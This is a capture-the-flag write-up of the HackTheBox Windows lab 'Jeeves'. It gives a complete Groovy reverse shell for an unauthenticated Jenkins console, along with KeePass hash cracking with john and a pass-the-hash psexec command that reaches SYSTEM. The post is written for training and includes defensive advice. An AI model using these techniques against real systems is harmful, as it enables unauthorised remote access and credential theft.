---
toc: true
comments: true
title: HackTheBox - Jeeves
layout: post
title: HackTheBox - Jeeves
date: 2024-07-05 18:28 -0300
categories: [HackTheBox, Medium, CTF]
tags: [Windows, Jenkins, Groovy, KeePass, John, Pass-the-Hash, ADS, PrivEsc]    
image: /assets/Posts/Jeeves/logo.png
---

## Pre
- Jeeves is a fantastic Windows box that strings together four very different skills: an unauthenticated **Jenkins** console, cracking a **KeePass** database, a **pass-the-hash**, and reading a flag hidden in an **NTFS Alternate Data Stream**.
- It's the Windows counterpart to the credential-hunting chain on [OpenAdmin](/posts/hackthebox-openadmin/) – lots of "find the secret the last step left behind".

## Phase 1: Recon
```shell
$ nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack
135/tcp   open  msrpc   syn-ack
445/tcp   open  microsoft-ds syn-ack
50000/tcp open  http    syn-ack
```

```shell
$ nmap -Pn -n -p 80,135,445,50000 -T4 -sSCV -A -oN nmap/versions $IP
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
```

Port 80 is a fake search-engine joke page. The interesting one is **50000/Jetty** – Jetty commonly fronts Jenkins. Fuzzing that port finds the app:

```shell
$ gobuster dir -u http://$IP:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/askjeeves            (Status: 302)
```

`http://10.10.10.63:50000/askjeeves/` opens a **Jenkins** dashboard – with **no authentication at all**.

## Phase 2: Jenkins Script Console → foothold
An unauthenticated Jenkins is game over: the *Script Console* (`Manage Jenkins → Script Console`) runs arbitrary **Groovy** on the master. We paste a Groovy reverse shell:

```groovy
String host="10.10.14.7";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();Thread.sleep(50);
  try{p.exitValue();break;}catch(Exception e){}
};
p.destroy();s.close();
```

With a listener up, we catch a shell as `jeeves\kohsuke` and grab the user flag from the desktop.

## Phase 3: Loot the KeePass database
Enumerating kohsuke's files, `Documents` holds a suspicious file:

```shell
C:\Users\kohsuke\Documents> dir
CEH.kdbx
```

A **KeePass** database (`.kdbx`). We exfiltrate it (base64 over the shell, or an SMB share) and crack its master password offline:

```shell
$ keepass2john CEH.kdbx > kp.hash
$ john kp.hash --wordlist=/usr/share/wordlists/rockyou.txt
moonshine1       (CEH)
```

Open it with `kpcli` and dump the entries. One entry, "Backup stuff", doesn't hold a password – it holds an **NTLM hash**:

```shell
kpcli:/> show -f "CEH/Backup stuff"
Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

## Phase 4: Pass-the-Hash to SYSTEM
We don't need to crack that hash – NTLM lets us authenticate *with the hash itself*. This is **pass-the-hash**. Using Impacket's `psexec.py`:

```shell
$ psexec.py administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
[*] Found writable share ADMIN$
...
C:\Windows\system32> whoami
nt authority\system
```

We're SYSTEM without ever knowing the administrator's plaintext password.

> Pass-the-hash works because NTLM authentication uses the hash, not the password, as the secret. This is why leaked hashes are as dangerous as leaked passwords, and why modern defences push for Kerberos, LAPS and Credential Guard.
{: .prompt-info }

## Phase 5: The hidden root flag (ADS)
On the administrator desktop, `root.txt` isn't where you'd expect – there's an `hm.txt` teasing us. The flag lives in an **NTFS Alternate Data Stream**, invisible to a normal `dir`. We reveal streams with `dir /r`:

```shell
C:\Users\Administrator\Desktop> dir /r
   hm.txt
   ...  root.txt:root.txt:$DATA
```

There it is: a stream named `root.txt` attached to the `root.txt` file. Read it explicitly:

```shell
C:\Users\Administrator\Desktop> more < root.txt:root.txt
```

## Conclusions
- Jeeves is a four-technique showcase: unauthenticated Jenkins Groovy RCE → KeePass cracking → pass-the-hash → NTFS ADS. Each step is a standalone skill worth practising.
- The standout lesson is that **you rarely need the plaintext password** on Windows – a hash is enough. And secrets hide in unexpected places (KeePass entries, alternate data streams).
- Defensive notes: never expose Jenkins without auth, don't store NTLM hashes in password managers "for backup", and remember that ADS can conceal data from casual inspection.
- Next up, a modern WordPress + Rocket.Chat + polkit chain on [Paper](/posts/hackthebox-paper/).

_Keep hacking_  🙈🙉🙊
